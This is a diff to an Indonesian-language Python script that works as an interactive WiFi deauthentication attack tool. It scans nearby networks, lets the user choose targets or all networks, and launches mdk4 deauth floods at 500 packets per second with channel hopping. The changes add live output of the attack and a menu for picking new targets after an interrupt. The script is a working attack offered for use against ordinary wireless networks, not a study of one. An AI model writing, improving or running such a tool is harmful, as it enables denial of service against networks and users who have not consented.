@@ -191,11 +191,9 @@ def scan_networks(adapter, duration=10):
         stderr=subprocess.DEVNULL,
     )
 
-    # Tampilkan progress scan dengan timer
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
     start_time = time.time()
     
-    # Loop selama proses scan berjalan atau sampai durasi habis
     while proc.poll() is None:
         elapsed = int(time.time() - start_time)
         remaining = max(0, duration - elapsed)
@@ -215,7 +213,6 @@ def scan_networks(adapter, duration=10):
     sys.stdout.write("\r" + " " * 60 + "\r")
     sys.stdout.flush()
 
-    # Pastikan proses berhenti
     if proc.poll() is None:
         proc.terminate()
         try:
@@ -224,7 +221,6 @@ def scan_networks(adapter, duration=10):
             proc.kill()
             proc.wait()
 
-    # Baca hasil scan
     networks = []
     seen = set()
     for csv_path in sorted(glob.glob(prefix + "-*.csv")):
@@ -244,7 +240,6 @@ def scan_networks(adapter, duration=10):
                 seen.add(key)
                 networks.append({"bssid": bssid, "channel": channel, "essid": essid})
 
-    # Bersihkan file temporary
     for path in glob.glob(prefix + "-*.csv"):
         try:
             os.remove(path)
@@ -401,6 +396,22 @@ def select_attack_mode():
 
 # ================= MDK4 FUNCTIONS =================
 
+def prompt_keyboard_interrupt_action():
+    print(f"\n  {YELLOW}[!] Keyboard interrupt diterima.{RESET}")
+    print(f"  {GREEN}1.{RESET} Pilih target lagi")
+    print(f"  {GREEN}2.{RESET} Kembali ke menu")
+    print(f"  {GREEN}3.{RESET} Keluar")
+
+    while True:
+        choice = input(f"\n  {YELLOW}>> pilih [1-3] : {RESET}").strip()
+        if choice == "1":
+            return "restart"
+        if choice == "2":
+            return "menu"
+        if choice == "3":
+            return "exit"
+        print(f"  {RED}[!] Input salah, pilih 1, 2, atau 3.{RESET}")
+
 def run_deauth_mdk4(targets, monitor_iface):
     if not targets:
         print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
@@ -419,7 +430,7 @@ def run_deauth_mdk4(targets, monitor_iface):
         
         print(f"\n  {CYAN}[*] Menyerang {len(targets)} target...{RESET}")
         for target in targets:
-            print(f"  - {target['essid']} | CH {target['channel']} | {target['bssid']}")
+            print(f"  - {target['essid'][:20]} | CH {target['channel']} | {target['bssid']}")
         
         mdk4_cmd = [
             "sudo", "mdk4", monitor_iface, "d",
@@ -430,13 +441,19 @@ def run_deauth_mdk4(targets, monitor_iface):
         
         print(f"\n  {YELLOW}[!] Packet Rate: 500 packets/detik{RESET}")
         print(f"  {YELLOW}[!] Channel Hopping: AKTIF{RESET}")
-        print(f"\n  {CYAN}Command: {' '.join(mdk4_cmd)}{RESET}")
+        print(f"\n  {GRAY}Command: {' '.join(mdk4_cmd)}{RESET}")
         print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
         
-        proc = subprocess.Popen(mdk4_cmd)
+        proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
         
+        # Tampilkan output MDK4 dengan indentasi
         try:
-            proc.wait()
+            while True:
+                output = proc.stdout.readline()
+                if output == '' and proc.poll() is not None:
+                    break
+                if output:
+                    print(f"  {output.strip()}")
         except KeyboardInterrupt:
             print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
             proc.terminate()
@@ -470,13 +487,18 @@ def run_deauth_all_mdk4(monitor_iface):
     
     print(f"\n  {CYAN}[*] Packet Rate: 500 packets/detik{RESET}")
     print(f"  {CYAN}[*] Channel Hopping: AKTIF{RESET}")
-    print(f"\n  {CYAN}Command: {' '.join(mdk4_cmd)}{RESET}")
+    print(f"\n  {GRAY}Command: {' '.join(mdk4_cmd)}{RESET}")
     print(f"\n  {GRAY}[!] Tekan Ctrl+C untuk menghentikan{RESET}\n")
     
-    proc = subprocess.Popen(mdk4_cmd)
+    proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     
     try:
-        proc.wait()
+        while True:
+            output = proc.stdout.readline()
+            if output == '' and proc.poll() is not None:
+                break
+            if output:
+                print(f"  {output.strip()}")
     except KeyboardInterrupt:
         print(f"\n  {YELLOW}[!] Menghentikan MDK4...{RESET}")
         proc.terminate()
@@ -487,8 +509,6 @@ def run_deauth_all_mdk4(monitor_iface):
             proc.wait()
         print(f"  {GREEN}[✓] Serangan dihentikan.{RESET}")
         time.sleep(0.5)
-
-# ================= BACK FUNCTIONS =================
 
 def back_to_menu():
     menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
@@ -506,49 +526,71 @@ def main():
     adapter = None
     monitor_iface = None
 
-    try:
-        adapter = select_interface()
-        monitor_iface = start_monitor_mode(adapter)
-        
-        attack_mode = select_attack_mode()
-        
-        if attack_mode == "target":
-            clear_screen()
-            draw_box_top(CYAN)
-            draw_box_title("SCAN WIFI", CYAN, YELLOW)
-            draw_box_bottom(CYAN)
+    while True:
+        try:
+            if monitor_iface is None:
+                adapter = select_interface()
+                monitor_iface = start_monitor_mode(adapter)
             
-            print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
-            scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
+            attack_mode = select_attack_mode()
             
-            if scan_input.isdigit() and int(scan_input) > 0:
-                scan_duration = int(scan_input)
-            else:
-                scan_duration = 10
-            
-            networks = scan_networks(monitor_iface, duration=scan_duration)
-            targets = select_targets(networks)
-            
-            if targets is None or not targets:
-                print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
+            if attack_mode == "target":
+                clear_screen()
+                draw_box_top(CYAN)
+                draw_box_title("SCAN WIFI", CYAN, YELLOW)
+                draw_box_bottom(CYAN)
+                
+                print(f"\n  {YELLOW}Mau scan berapa detik? (default 10){RESET}")
+                scan_input = input(f"  {YELLOW}>> detik : {RESET}").strip()
+                
+                if scan_input.isdigit() and int(scan_input) > 0:
+                    scan_duration = int(scan_input)
+                else:
+                    scan_duration = 10
+                
+                networks = scan_networks(monitor_iface, duration=scan_duration)
+                targets = select_targets(networks)
+                
+                if targets is None or not targets:
+                    print(f"\n  {RED}[✗] Tidak ada target.{RESET}")
+                    stop_monitor_mode(monitor_iface)
+                    return
+                
+                run_deauth_mdk4(targets, monitor_iface)
+                
+                # Setelah serangan selesai
+                print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
+                input()
                 stop_monitor_mode(monitor_iface)
-                return
-            
-            run_deauth_mdk4(targets, monitor_iface)
-        else:
-            run_deauth_all_mdk4(monitor_iface)
-        
-        stop_monitor_mode(monitor_iface)
-        
-        print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
-        input()
-        back_to_menu()
+                back_to_menu()
+                break
+            else:
+                run_deauth_all_mdk4(monitor_iface)
+                
+                # Setelah serangan selesai
+                print(f"\n  {YELLOW}[!] Tekan Enter untuk kembali...{RESET}")
+                input()
+                stop_monitor_mode(monitor_iface)
+                back_to_menu()
+                break
 
-    except KeyboardInterrupt:
-        print(f"\n\n  {YELLOW}[!] Dibatalkan oleh user{RESET}")
-        if monitor_iface:
-            stop_monitor_mode(monitor_iface)
-        back_to_menu()
+        except KeyboardInterrupt:
+            action = prompt_keyboard_interrupt_action()
+            if action == "restart":
+                print(f"\n  {YELLOW}Mengulang ke pemilihan target...{RESET}")
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                    monitor_iface = None
+                continue
+            elif action == "menu":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                back_to_menu()
+            elif action == "exit":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                clear_screen()
+                sys.exit(0)
 
 if __name__ == "__main__":
     main()
